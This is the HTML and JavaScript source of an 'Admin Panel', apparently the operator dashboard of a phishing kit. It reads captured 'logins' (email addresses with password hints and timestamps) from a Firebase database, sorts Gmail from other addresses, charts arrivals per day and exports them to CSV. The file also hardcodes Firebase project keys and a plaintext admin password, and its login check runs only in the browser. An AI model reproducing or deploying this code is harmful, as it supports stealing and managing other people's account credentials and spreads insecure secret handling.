<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Admin Panel</title>
<style>
:root{
  --bg1:#0b0c10;
  --bg2:#1f2833;
  --bg3:#0b0c10;
  --glass:rgba(255,255,255,0.05);
  --blur:20px;
  --accent:#ff3b94;
  --text:#fff;
  --gmail:#00c853;
  --nonGmail:#ffab00;
}
*{box-sizing:border-box;font-family:Inter,Arial,sans-serif;transition:.3s;}
body{
  margin:0;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:flex-start;
  background:linear-gradient(135deg,var(--bg1),var(--bg2),var(--bg3));
  background-size:400% 400%;
  animation:bgMove 15s ease infinite;
  padding:40px 20px;
  color:var(--text);
}
@keyframes bgMove{
  0%{background-position:0% 50%;}
  50%{background-position:100% 50%;}
  100%{background-position:0% 50%;}
}
.card{
  backdrop-filter:blur(var(--blur));
  background:var(--glass);
  border:1px solid rgba(255,255,255,0.2);
  border-radius:16px;
  padding:24px;
  max-width:700px;
  width:100%;
  text-align:center;
  box-shadow:0 8px 28px rgba(0,0,0,0.6);
  animation:fadeIn 0.8s ease;
}
h2{margin-bottom:20px;}
input{
  width:100%;
  padding:12px;
  border-radius:10px;
  border:none;
  margin:10px 0;
  background:rgba(255,255,255,0.15);
  color:#fff;
}
input::placeholder{color:rgba(255,255,255,0.6);}
button{
  padding:10px 16px;
  border:none;
  border-radius:10px;
  cursor:pointer;
  background:var(--accent);
  color:#fff;
  font-weight:600;
  margin-top:10px;
  width:100%;
}
button:hover{opacity:.85;transform:translateY(-2px);}
#panel{display:none;max-height:70vh;overflow-y:auto;margin-top:20px;}
.loginEntry{
  display:flex;
  justify-content:space-between;
  align-items:center;
  padding:6px 0;
  font-family:monospace;
  opacity:0;
  transform:translateX(-20px);
  transition:all .4s;
}
.loginEntry.show{
  opacity:1;
  transform:translateX(0);
}
.loginEntry button{
  background:#ff0000;
  padding:4px 8px;
  font-size:12px;
  border:none;
  border-radius:6px;
  cursor:pointer;
}
.loginEntry button:hover{opacity:.85;}
.pwWrap{position:relative;}
.pwWrap svg{
  position:absolute;
  right:12px;
  top:50%;
  transform:translateY(-50%);
  width:20px;
  cursor:pointer;
  opacity:.7;
}
.stats{
  display:flex;
  justify-content:space-between;
  margin-bottom:16px;
  gap:10px;
}
.statCard{
  flex:1;
  padding:12px;
  background:rgba(255,255,255,0.1);
  border-radius:10px;
}
#chartWrap{
  margin-top:20px;
}
.hidden{display:none!important;}
@keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
</style>
</head>
<body>

<div id="loginCard" class="card">
  <h2>Admin Login</h2>
  <div class="pwWrap">
    <input id="adminUser" placeholder="Username"/>
  </div>
  <div class="pwWrap">
    <input id="adminPass" type="password" placeholder="Password"/>
    <svg id="eye" viewBox="0 0 24 24">
      <path id="eyeOpen" fill="currentColor" d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 110-10 5 5 0 010 10z"/>
      <path id="eyeSlash" class="hidden" fill="currentColor" d="M3 3l18 18-1.5 1.5L18 20c-2.5 2-5 3-6 3-7 0-11-7-11-7 1.1-1.9 2.6-3.5 4.2-5L1.5 4.5 3 3z"/>
    </svg>
  </div>
  <button id="btnLogin">Login</button>
</div>

<div id="panel" class="card">
  <h2>Received Logins</h2>
  <div class="stats">
    <div class="statCard">Total: <span id="totalCount">0</span></div>
    <div class="statCard">Today: <span id="todayCount">0</span></div>
    <div class="statCard">This Week: <span id="weekCount">0</span></div>
  </div>
  <div id="loginList"></div>
  <button id="exportCSV">Export CSV</button>
  <div id="chartWrap">
    <canvas id="loginChart" height="120"></canvas>
  </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-database.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-analytics.js";

import Chart from "https://cdn.jsdelivr.net/npm/chart.js";

const firebaseConfig = {
  apiKey: "AIzaSyD8KAm2FHtdUr4xilbVGZyVSGGdu2vyYiE",
  authDomain: "w3bsite-aa4a3.firebaseapp.com",
  databaseURL: "https://w3bsite-aa4a3-default-rtdb.firebaseio.com",
  projectId: "w3bsite-aa4a3",
  storageBucket: "w3bsite-aa4a3.firebasestorage.app",
  messagingSenderId: "510630950165",
  appId: "1:510630950165:web:b5f0cbbbbac127c7ece51c",
  measurementId: "G-9LPYJJ3D5E"
};

const app = initializeApp(firebaseConfig);
try { getAnalytics(app); } catch(e){ console.warn('Analytics skipped'); }
const db = getDatabase(app);

const ADMIN_USER = "blue";
const ADMIN_PASS = "shimono08";

const loginCard = document.getElementById('loginCard');
const panel = document.getElementById('panel');
const loginList = document.getElementById('loginList');
const eye = document.getElementById('eye');
const adminPass = document.getElementById('adminPass');
const eyeOpen = document.getElementById('eyeOpen');
const eyeSlash = document.getElementById('eyeSlash');

const totalCountEl = document.getElementById("totalCount");
const todayCountEl = document.getElementById("todayCount");
const weekCountEl = document.getElementById("weekCount");
const exportCSVBtn = document.getElementById("exportCSV");
const chartCanvas = document.getElementById("loginChart");

// Password toggle
eye.onclick = ()=>{
  if(adminPass.type==="password"){
    adminPass.type="text";
    eyeOpen.classList.add("hidden");
    eyeSlash.classList.remove("hidden");
  } else {
    adminPass.type="password";
    eyeSlash.classList.add("hidden");
    eyeOpen.classList.remove("hidden");
  }
};

document.getElementById('btnLogin').onclick = () => {
    const user = document.getElementById('adminUser').value.trim();
    const pass = adminPass.value.trim();
    
    if(user === ADMIN_USER && pass === ADMIN_PASS){
        loginCard.style.display = 'none';
        panel.style.display = 'block';

        const loginsRef = ref(db,'logins/');
        onValue(loginsRef, snapshot => {
            const data = snapshot.val();
            loginList.innerHTML = '';
            let total=0, today=0, week=0;
            let chartData = {};

            const now = new Date();
            const startWeek = new Date();
            startWeek.setDate(now.getDate() - now.getDay());

            if(data){
              for(const k in data){
                  total++;

                  const logTime = new Date(data[k].time);
                  if(logTime.toDateString() === now.toDateString()) today++;
                  if(logTime >= startWeek) week++;

                  const color = data[k].email.endsWith("@gmail.com")?"var(--gmail)":"var(--nonGmail)";

                  const div = document.createElement('div');
                  div.classList.add('loginEntry');
                  div.innerHTML = `<span style="color:${color}">${data[k].email} : ${data[k].pwd_hint} (${data[k].time})</span>
                                   <button onclick="deleteEntry('${k}')">Del</button>`;
                  loginList.appendChild(div);
                  setTimeout(()=>div.classList.add('show'),50);

                  // Chart
                  const dayKey = logTime.toDateString();
                  chartData[dayKey] = (chartData[dayKey]||0)+1;
              }
            }

            totalCountEl.textContent = total;
            todayCountEl.textContent = today;
            weekCountEl.textContent = week;

            // Chart
            const labels = Object.keys(chartData);
            const counts = Object.values(chartData);
            new Chart(chartCanvas,{
              type:'bar',
              data:{labels, datasets:[{label:'Logins per day', data:counts, backgroundColor:'rgba(255,59,148,0.6)'}]},
              options:{plugins:{legend:{display:false}},responsive:true,maintainAspectRatio:false}
            });
        });
    } else {
        alert('Invalid username or password');
    }
};

window.deleteEntry = function(key){
    if(confirm('Delete this login?')){
        remove(ref(db,'logins/'+key));
    }
};

// Export CSV
exportCSVBtn.onclick = ()=>{
  const rows = [["Email","Password Hint","Time"]];
  const divs = loginList.querySelectorAll(".loginEntry span");
  divs.forEach(span=>{
    const text = span.textContent.replace(/\s*\(\d{1,2}\/\d{1,2}\/\d{4},.*\)$/,"");
    const timeMatch = span.textContent.match(/\((.+)\)$/);
    const time = timeMatch?timeMatch[1]:"";
    const parts = text.split(" : ");
    rows.push([...parts, time]);
  });
  const csv = rows.map(r=>r.join(",")).join("\n");
  const blob = new Blob([csv],{type:"text/csv"});
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "logins.csv";
  a.click();
};
</script>
</body>
</html>
